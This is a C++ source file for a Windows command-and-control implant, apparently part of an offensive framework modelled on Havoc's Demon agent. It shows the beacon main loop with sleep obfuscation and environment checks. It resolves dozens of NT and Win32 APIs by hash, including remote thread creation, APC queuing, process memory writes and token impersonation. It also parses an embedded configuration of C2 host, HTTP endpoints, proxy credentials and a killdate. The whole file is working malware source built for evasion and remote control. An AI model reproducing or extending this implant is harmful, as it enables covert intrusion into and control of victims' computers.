#include <core/include/implant.hpp>
// todo: define CFG_SIZE macro

namespace Implant {
    __text(F) uint8_t _config[CFG_SIZE] = { "AAAAAAAA", };

    VOID MainRoutine() {

        do {
            Opsec::SleepObf();
            x_assert(Opsec::RuntimeChecks());

            if (!Opsec::CheckTime()) {
                continue;
            }

            if (!Ctx->session.checkin && !Ctx->transport.outbound_queue) {
                x_assert(Opsec::CheckEnvironment());
            }

            Dispatcher::DispatchRoutine();

            if (!NT_SUCCESS(ntstatus)) {
                Ctx->session.retry++;

                if (Ctx->session.retry == 3) { break; }
                continue;
            }

            Ctx->session.retry = 0;
        }
        while (ntstatus != ERROR_EXIT);

    defer:
        Memory::Context::ContextDestroy();
    }


    BOOL ResolveApi() {
        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368

        bool            success     = true;
        OSVERSIONINFOW  OSVersionW  = { };

        x_assertb(Ctx->modules.kernel32 = M_PTR(KERNEL32));
        x_assertb(Ctx->modules.kernbase = M_PTR(KERNELBASE));

        x_assertb(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION));

        Ctx->session.version = WIN_VERSION_UNKNOWN;
        OSVersionW.dwOSVersionInfoSize = sizeof(OSVersionW);

        x_ntassertb(Ctx->nt.RtlGetVersion(&OSVersionW));

        if (OSVersionW.dwMajorVersion >= 5) {
            if (OSVersionW.dwMajorVersion == 5) {
                if (OSVersionW.dwMinorVersion == 1) {
                    Ctx->session.version = WIN_VERSION_XP;
                }
            }
            else if (OSVersionW.dwMajorVersion == 6) {
                if (OSVersionW.dwMinorVersion == 0) {
                    Ctx->session.version = WIN_VERSION_2008;
                }
                else if (OSVersionW.dwMinorVersion == 1) {
                    Ctx->session.version = WIN_VERSION_2008_R2;
                }
                else if (OSVersionW.dwMinorVersion == 2) {
                    Ctx->session.version = WIN_VERSION_2012;
                }
                else if (OSVersionW.dwMinorVersion == 3) {
                    Ctx->session.version = WIN_VERSION_2012_R2;
                }
            }
            else if (OSVersionW.dwMajorVersion == 10) {
                if (OSVersionW.dwMinorVersion == 0) {
                    Ctx->session.version = WIN_VERSION_2016_X;
                }
            }
        }

        x_assertb(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory,           Ctx->modules.ntdll, NTFREEVIRTUALMEMORY)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtAllocateVirtualMemory,       Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtProtectVirtualMemory,        Ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtReadVirtualMemory,           Ctx->modules.ntdll, NTREADVIRTUALMEMORY)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtWriteVirtualMemory,          Ctx->modules.ntdll, NTWRITEVIRTUALMEMORY)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryVirtualMemory,          Ctx->modules.ntdll, NTQUERYVIRTUALMEMORY)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateSection,               Ctx->modules.ntdll, NTCREATESECTION)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtMapViewOfSection,            Ctx->modules.ntdll, NTMAPVIEWOFSECTION)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtUnmapViewOfSection,          Ctx->modules.ntdll, NTUNMAPVIEWOFSECTION)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenProcess,                 Ctx->modules.ntdll, NTOPENPROCESS)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateUserProcess,           Ctx->modules.ntdll, NTCREATEUSERPROCESS)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtTerminateProcess,            Ctx->modules.ntdll, NTTERMINATEPROCESS)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtTerminateThread,             Ctx->modules.ntdll, NTTERMINATETHREAD)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlCreateProcessParametersEx,  Ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlDestroyProcessParameters,   Ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenProcessToken,            Ctx->modules.ntdll, NTOPENPROCESSTOKEN)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenThreadToken,             Ctx->modules.ntdll, NTOPENTHREADTOKEN)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtDuplicateToken,              Ctx->modules.ntdll, NTDUPLICATETOKEN)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtDuplicateObject,             Ctx->modules.ntdll, NTDUPLICATEOBJECT)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryInformationToken,       Ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryInformationProcess,     Ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlCreateHeap,                 Ctx->modules.ntdll, RTLCREATEHEAP)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlAllocateHeap,               Ctx->modules.ntdll, RTLALLOCATEHEAP)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlReAllocateHeap,             Ctx->modules.ntdll, RTLREALLOCATEHEAP)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlFreeHeap,                   Ctx->modules.ntdll, RTLFREEHEAP)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlDestroyHeap,                Ctx->modules.ntdll, RTLDESTROYHEAP)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlInitUnicodeString,          Ctx->modules.ntdll, RTLINITUNICODESTRING)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlAddVectoredExceptionHandler, Ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlRemoveVectoredExceptionHandler, Ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateThreadEx,              Ctx->modules.ntdll, NTCREATETHREADEX)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtDeviceIoControlFile,         Ctx->modules.ntdll, NTDEVICEIOCONTROLFILE)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenFile,                    Ctx->modules.ntdll, NTOPENFILE)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenThread,                  Ctx->modules.ntdll, NTOPENTHREAD)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlRandomEx,                   Ctx->modules.ntdll, RTLRANDOMEX)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtResumeThread,                Ctx->modules.ntdll, NTRESUMETHREAD)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtGetContextThread,            Ctx->modules.ntdll, NTGETCONTEXTTHREAD)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtSetContextThread,            Ctx->modules.ntdll, NTSETCONTEXTTHREAD)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtSetInformationThread,        Ctx->modules.ntdll, NTSETINFORMATIONTHREAD)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtWaitForSingleObject,         Ctx->modules.ntdll, NTWAITFORSINGLEOBJECT)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.TpAllocWork,                   Ctx->modules.ntdll, TPALLOCWORK)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.TpPostWork,                    Ctx->modules.ntdll, TPPOSTWORK)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.TpReleaseWork,                 Ctx->modules.ntdll, TPRELEASEWORK)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtTestAlert,                   Ctx->modules.ntdll, NTTESTALERT)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtClose,                       Ctx->modules.ntdll, NTCLOSE)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlGetVersion,                 Ctx->modules.ntdll, RTLGETVERSION)) ;
        x_assertb(F_PTR_HMOD(Ctx->nt.NtQuerySystemInformation,      Ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));

        defer:
        return success;
    }

    BOOL ReadConfig() {

        bool    success = true;
        _parser parser  = { };

        Parser::CreateParser(&parser, _config, sizeof(_config));
        x_memset(_config, 0, sizeof(_config));

        Parser::ParserMemcpy(&parser, &Ctx->config.key, nullptr);
        Parser::ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);

        //Xtea::XteaCrypt(B_PTR(Parser.Buffer), Parser.Length - 0x12, Ctx->config.Key, FALSE);
        // todo: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary

        if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA))) {
            x_assertb(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
            x_assertb(Ctx->modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
            x_assertb(Ctx->modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
            x_assertb(Ctx->modules.iphlpapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
            x_assertb(Ctx->modules.mscoree  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
        }
        else {
            success_(false);
        }

        x_assertb(F_PTR_HMOD(Ctx->nt.SetProcessValidCallTargets,         Ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
        x_assertb(F_PTR_HMOD(Ctx->win32.FreeLibrary,                     Ctx->modules.kernel32, FREELIBRARY));
        x_assertb(F_PTR_HMOD(Ctx->win32.Heap32ListFirst,                 Ctx->modules.kernel32, HEAP32LISTFIRST));
        x_assertb(F_PTR_HMOD(Ctx->win32.Heap32ListNext,                  Ctx->modules.kernel32, HEAP32LISTNEXT));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetProcessHeap,                  Ctx->modules.kernel32, GETPROCESSHEAP));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetProcessHeaps,                 Ctx->modules.kernel32, GETPROCESSHEAPS));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetProcAddress,                  Ctx->modules.kernel32, GETPROCADDRESS));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetModuleHandleA,                Ctx->modules.kernel32, GETMODULEHANDLEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.IsWow64Process,                  Ctx->modules.kernel32, ISWOW64PROCESS));
        x_assertb(F_PTR_HMOD(Ctx->win32.OpenProcess,                     Ctx->modules.kernel32, OPENPROCESS));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateToolhelp32Snapshot,        Ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT));
        x_assertb(F_PTR_HMOD(Ctx->win32.Process32First,                  Ctx->modules.kernel32, PROCESS32FIRST));
        x_assertb(F_PTR_HMOD(Ctx->win32.Process32Next,                   Ctx->modules.kernel32, PROCESS32NEXT));
        x_assertb(F_PTR_HMOD(Ctx->win32.Module32First,                   Ctx->modules.kernel32, MODULE32FIRST));
        x_assertb(F_PTR_HMOD(Ctx->win32.Module32Next,                    Ctx->modules.kernel32, MODULE32NEXT));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetCurrentProcessId,             Ctx->modules.kernel32, GETCURRENTPROCESSID));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetProcessId,                    Ctx->modules.kernel32, GETPROCESSID));
        x_assertb(F_PTR_HMOD(Ctx->win32.GlobalMemoryStatusEx,            Ctx->modules.kernel32, GLOBALMEMORYSTATUSEX));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetComputerNameExA,              Ctx->modules.kernel32, GETCOMPUTERNAMEEXA));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetLastError,                    Ctx->modules.kernel32, SETLASTERROR));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetLastError,                    Ctx->modules.kernel32, GETLASTERROR));
        x_assertb(F_PTR_HMOD(Ctx->win32.RegOpenKeyExA,                   Ctx->modules.kernel32, REGOPENKEYEXA));
        x_assertb(F_PTR_HMOD(Ctx->win32.RegCreateKeyExA,                 Ctx->modules.kernel32, REGCREATEKEYEXA));
        x_assertb(F_PTR_HMOD(Ctx->win32.RegSetValueExA,                  Ctx->modules.kernel32, REGSETVALUEEXA));
        x_assertb(F_PTR_HMOD(Ctx->win32.RegCloseKey,                     Ctx->modules.kernel32, REGCLOSEKEY));
        x_assertb(F_PTR_HMOD(Ctx->win32.ReadFile,                        Ctx->modules.kernel32, READFILE));
        x_assertb(F_PTR_HMOD(Ctx->win32.WriteFile,                       Ctx->modules.kernel32, WRITEFILE));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateFileW,                     Ctx->modules.kernel32, CREATEFILEW));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetFileSizeEx,                   Ctx->modules.kernel32, GETFILESIZEEX));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetFilePointer,                  Ctx->modules.kernel32, SETFILEPOINTER));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetFullPathNameA,                Ctx->modules.kernel32, GETFULLPATHNAMEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.FindFirstFileA,                  Ctx->modules.kernel32, FINDFIRSTFILEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.FindClose,                       Ctx->modules.kernel32, FINDCLOSE));
        x_assertb(F_PTR_HMOD(Ctx->win32.FindNextFileA,                   Ctx->modules.kernel32, FINDNEXTFILEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetCurrentDirectoryA,            Ctx->modules.kernel32, GETCURRENTDIRECTORYA));
        x_assertb(F_PTR_HMOD(Ctx->win32.FileTimeToSystemTime,            Ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
        x_assertb(F_PTR_HMOD(Ctx->win32.SystemTimeToTzSpecificLocalTime, Ctx->modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetLocalTime,                    Ctx->modules.kernel32, GETLOCALTIME));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetSystemTimeAsFileTime,         Ctx->modules.kernel32, GETSYSTEMTIMEASFILETIME));
        x_assertb(F_PTR_HMOD(Ctx->win32.FormatMessageA,                  Ctx->modules.kernel32, FORMATMESSAGEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateRemoteThread,              Ctx->modules.kernel32, CREATEREMOTETHREAD));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateThread,                    Ctx->modules.kernel32, CREATETHREAD));
        x_assertb(F_PTR_HMOD(Ctx->win32.ExitThread,                      Ctx->modules.kernel32, EXITTHREAD));
        x_assertb(F_PTR_HMOD(Ctx->win32.QueueUserAPC,                    Ctx->modules.kernel32, QUEUEUSERAPC));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetThreadLocale,                 Ctx->modules.kernel32, GETTHREADLOCALE));
        x_assertb(F_PTR_HMOD(Ctx->win32.SleepEx,                         Ctx->modules.kernel32, SLEEPEX));
        x_assertb(F_PTR_HMOD(Ctx->win32.FindResourceA,                   Ctx->modules.kernel32, FINDRESOURCEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.LoadResource,                    Ctx->modules.kernel32, LOADRESOURCE));
        x_assertb(F_PTR_HMOD(Ctx->win32.LockResource,                    Ctx->modules.kernel32, LOCKRESOURCE));
        x_assertb(F_PTR_HMOD(Ctx->win32.SizeofResource,                  Ctx->modules.kernel32, SIZEOFRESOURCE));
        x_assertb(F_PTR_HMOD(Ctx->win32.FreeResource,                    Ctx->modules.kernel32, FREERESOURCE));
        x_assertb(F_PTR_HMOD(Ctx->win32.CallNamedPipeW,                  Ctx->modules.kernel32, CALLNAMEDPIPEW));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateNamedPipeW,                Ctx->modules.kernel32, CREATENAMEDPIPEW));
        x_assertb(F_PTR_HMOD(Ctx->win32.WaitNamedPipeW,                  Ctx->modules.kernel32, WAITNAMEDPIPEW));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetNamedPipeHandleState,         Ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE));
        x_assertb(F_PTR_HMOD(Ctx->win32.ConnectNamedPipe,                Ctx->modules.kernel32, CONNECTNAMEDPIPE));
        x_assertb(F_PTR_HMOD(Ctx->win32.TransactNamedPipe,               Ctx->modules.kernel32, TRANSACTNAMEDPIPE));
        x_assertb(F_PTR_HMOD(Ctx->win32.DisconnectNamedPipe,             Ctx->modules.kernel32, DISCONNECTNAMEDPIPE));
        x_assertb(F_PTR_HMOD(Ctx->win32.PeekNamedPipe,                   Ctx->modules.kernel32, PEEKNAMEDPIPE));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpOpen,                     Ctx->modules.winhttp, WINHTTPOPEN));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpConnect,                  Ctx->modules.winhttp, WINHTTPCONNECT));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpOpenRequest,              Ctx->modules.winhttp, WINHTTPOPENREQUEST));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpAddRequestHeaders,        Ctx->modules.winhttp, WINHTTPADDREQUESTHEADERS));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpSetOption,                Ctx->modules.winhttp, WINHTTPSETOPTION));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpGetProxyForUrl,           Ctx->modules.winhttp, WINHTTPGETPROXYFORURL));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpSendRequest,              Ctx->modules.winhttp, WINHTTPSENDREQUEST));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpReceiveResponse,          Ctx->modules.winhttp, WINHTTPRECEIVERESPONSE));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpReadData,                 Ctx->modules.winhttp, WINHTTPREADDATA));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpQueryHeaders,             Ctx->modules.winhttp, WINHTTPQUERYHEADERS));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpQueryDataAvailable,       Ctx->modules.winhttp, WINHTTPQUERYDATAAVAILABLE));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpCloseHandle,              Ctx->modules.winhttp, WINHTTPCLOSEHANDLE));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetAdaptersInfo,                 Ctx->modules.iphlpapi, GETADAPTERSINFO));
        x_assertb(F_PTR_HMOD(Ctx->win32.CryptStringToBinaryA,            Ctx->modules.crypt32, CRYPTSTRINGTOBINARYA));
        x_assertb(F_PTR_HMOD(Ctx->win32.CryptBinaryToStringA,            Ctx->modules.crypt32, CRYPTBINARYTOSTRINGA));
        x_assertb(F_PTR_HMOD(Ctx->win32.AdjustTokenPrivileges,           Ctx->modules.advapi, ADJUSTTOKENPRIVILEGES));
        x_assertb(F_PTR_HMOD(Ctx->win32.ImpersonateLoggedOnUser,         Ctx->modules.advapi, IMPERSONATELOGGEDONUSER));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetUserNameA,                    Ctx->modules.advapi, GETUSERNAMEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.LookupAccountSidW,               Ctx->modules.advapi, LOOKUPACCOUNTSIDW));
        x_assertb(F_PTR_HMOD(Ctx->win32.LookupPrivilegeValueA,           Ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetEntriesInAclA,                Ctx->modules.advapi, SETENTRIESINACLA));
        x_assertb(F_PTR_HMOD(Ctx->win32.AllocateAndInitializeSid,        Ctx->modules.advapi, ALLOCATEANDINITIALIZESID));
        x_assertb(F_PTR_HMOD(Ctx->win32.AddMandatoryAce,                 Ctx->modules.advapi, ADDMANDATORYACE));
        x_assertb(F_PTR_HMOD(Ctx->win32.InitializeSecurityDescriptor,    Ctx->modules.advapi, INITIALIZESECURITYDESCRIPTOR));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorDacl,       Ctx->modules.advapi, SETSECURITYDESCRIPTORDACL));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorSacl,       Ctx->modules.advapi, SETSECURITYDESCRIPTORSACL));
        x_assertb(F_PTR_HMOD(Ctx->win32.InitializeAcl,                   Ctx->modules.advapi, INITIALIZEACL));
        x_assertb(F_PTR_HMOD(Ctx->win32.FreeSid,                         Ctx->modules.advapi, FREESID));

        Ctx->transport.outbound_queue = nullptr;

        Ctx->session.peer_id    = Parser::UnpackDword(&parser);
        Ctx->config.sleeptime   = Parser::UnpackDword(&parser);
        Ctx->config.jitter      = Parser::UnpackDword(&parser);
        Ctx->config.hours       = Parser::UnpackDword(&parser);
        Ctx->config.killdate    = Parser::UnpackDword64(&parser);

#ifdef TRANSPORT_HTTP
        Ctx->transport.http = (_http_context*) x_malloc(sizeof(_http_context));

        Ctx->transport.http->handle     = nullptr;
        Ctx->transport.http->endpoints  = nullptr;
        Ctx->transport.http->headers    = nullptr;

        Parser::ParserWcscpy(&parser, &Ctx->transport.http->useragent, nullptr);
        Parser::ParserWcscpy(&parser, &Ctx->transport.http->address, nullptr  );
        Ctx->transport.http->port = (int) Parser::UnpackDword(&parser);

        Ctx->transport.http->n_endpoints = Parser::UnpackDword(&parser);
        Ctx->transport.http->endpoints  = (wchar_t**) x_malloc(sizeof(wchar_t*) * ((Ctx->transport.http->n_endpoints + 1)));

        for (auto i = 0; i < Ctx->transport.http->n_endpoints; i++) {
            Parser::ParserWcscpy(&parser, &Ctx->transport.http->endpoints[i], nullptr);
        }

        Ctx->transport.http->endpoints[Ctx->transport.http->n_endpoints] = nullptr;

        Parser::ParserStrcpy(&parser, &Ctx->transport.domain, nullptr);
        Ctx->transport.b_proxy = Parser::UnpackBool(&parser);

        if (Ctx->transport.b_proxy) {
            Ctx->transport.http->proxy = (_proxy*) x_malloc(sizeof(_proxy));
            Ctx->transport.http->access = INTERNET_OPEN_TYPE_PROXY;

            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->address, nullptr );
            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->username, nullptr );
            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->password, nullptr );
        }
#endif
#ifdef TRANSPORT_PIPE
        Parser::ParserWcscpy(&parser, &Ctx->transport.pipe_name, nullptr);
#endif

    defer:
        Parser::DestroyParser(&parser);
        return success;
    }
}

VOID Entrypoint(HMODULE Base) {

    NT_ASSERT(Memory::Context::ContextInit());
    NT_ASSERT(Implant::ResolveApi());
    NT_ASSERT(Implant::ReadConfig());

    Implant::MainRoutine();
}
